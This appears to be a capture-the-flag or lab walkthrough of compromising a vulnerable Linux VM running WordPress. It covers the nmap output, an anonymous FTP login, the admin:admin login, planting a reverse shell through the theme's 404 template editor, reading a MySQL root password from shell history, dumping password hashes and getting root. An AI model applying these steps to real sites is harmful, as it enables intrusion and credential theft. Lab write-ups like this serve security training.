

# NMAP

```bash
PORT   STATE SERVICE REASON  VERSION

21/tcp open  ftp     syn-ack vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.49.97
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 08:ee:e3:ff:31:20:87:6c:12:e7:1c:aa:c4:e7:54:f2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKrYYWK3Xv2EBb0KryPAargHdeVdVuGj+AHTUbH1CyLIuQ3zbtaq2+lr5K/aMqiJ5othz27+RWSJ2NmQ2JeOUBCogFLikCwU6MRDQLHpV+neS3fAKrH5fNnXo+RfnMWBLQaaXBPiUOQaoQc27hRN3SJ1hbVLEF65TY0siTrOj0Lt8SRztwkbfynHEKxMsQi5WWDLTgS7bivCf9VVWwqgmuBbsJAqFExDjLxlxJpH4+93bgEtD9EPV/KKO9B3Inaz8PxC+zXZofhZXloysYoGg4IZzT55JzrRVRuv/cbGcMuGTBpCCkdH01G4NCSgL7YwX13C1Qc+EFX1QExV6k1ePD
|   256 ad:e1:1c:7d:e7:86:76:be:9a:a8:bd:b9:68:92:77:87 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFTsqff4O0hsl+RUR2lXFcbCEkvFcspHALA2RR2DpoD2AlRN/DEpIbW3NETNXxxyKHTtGhUiBSUuw8S9RSBAsnY=
|   256 0c:e1:eb:06:0c:5c:b5:cc:1b:d1:fa:56:06:22:31:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH91w++CdkbeAkmXYietVhD/73nEaXR/nbeBEyuwLwgq

80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_Hackers
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

# FTP 

--> Anonymous login allowed

![image](https://user-images.githubusercontent.com/68326057/117525095-72e2d180-afde-11eb-9874-b0096b00a1da.png)


# WEB

## /robots.txt

--> /wordpress

## /upload

![image](https://user-images.githubusercontent.com/68326057/117525252-f8668180-afde-11eb-99b6-85c6210242d0.png)

# /wordpress

--> admin:admin

![image](https://user-images.githubusercontent.com/68326057/117525406-c3a6fa00-afdf-11eb-9982-b5be7b86f102.png)

![image](https://user-images.githubusercontent.com/68326057/117525410-cbff3500-afdf-11eb-81f5-61a4c01719c2.png)


--> apperance --> editor.
-->select twentyfourteen --> 404 template.
--> paste ur reverse shell. 
--> press update

![image](https://user-images.githubusercontent.com/68326057/117525491-2f896280-afe0-11eb-89a6-5878cbeb4cdc.png)

![image](https://user-images.githubusercontent.com/68326057/117526100-7b3c0c00-afe0-11eb-89c5-a3d9c6674bc1.png)

--> http://192.168.97.50/wordpress/wp-content/themes/twentyfourteen/404.php

# USER - WWW-DATA

![image](https://user-images.githubusercontent.com/68326057/117526108-8727ce00-afe0-11eb-9102-4c94658c05bc.png)


![image](https://user-images.githubusercontent.com/68326057/117526139-b9393000-afe0-11eb-900c-82f384d6a7dd.png)

![image](https://user-images.githubusercontent.com/68326057/117526163-e1c12a00-afe0-11eb-9977-7fb14e962cbb.png)


HISTORY

![image](https://user-images.githubusercontent.com/68326057/117526178-03baac80-afe1-11eb-9ff0-eb954939d7da.png)

```bash
mysql -uroot -prootpassword!

```


```bash

www-data@ubuntu:/var/www$ mysql -u root -p -D wordpress -e 'SELECT * FROM wp_users;' -p
               
Enter password: rootpassword!   

+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                        | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | root       | a318e4507e5a74604aafb45e4741edd3 | btrisk        | mdemir@btrisk.com |          | 2017-04-24 17:37:04 |                     |           0 | btrisk       |
|  2 | admin      | 21232f297a57a5a743894a0e4a801fc3 | admin         | ikaya@btrisk.com  |          | 2017-04-24 17:37:04 |                     |           4 | admin        |
+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+------------

```

![image](https://user-images.githubusercontent.com/68326057/117526254-8b082000-afe1-11eb-8a6a-fca07c606262.png)


```bash
root : roottoor
```

# ROOT

![image](https://user-images.githubusercontent.com/68326057/117526266-b12dc000-afe1-11eb-8d63-673eba856d86.png)

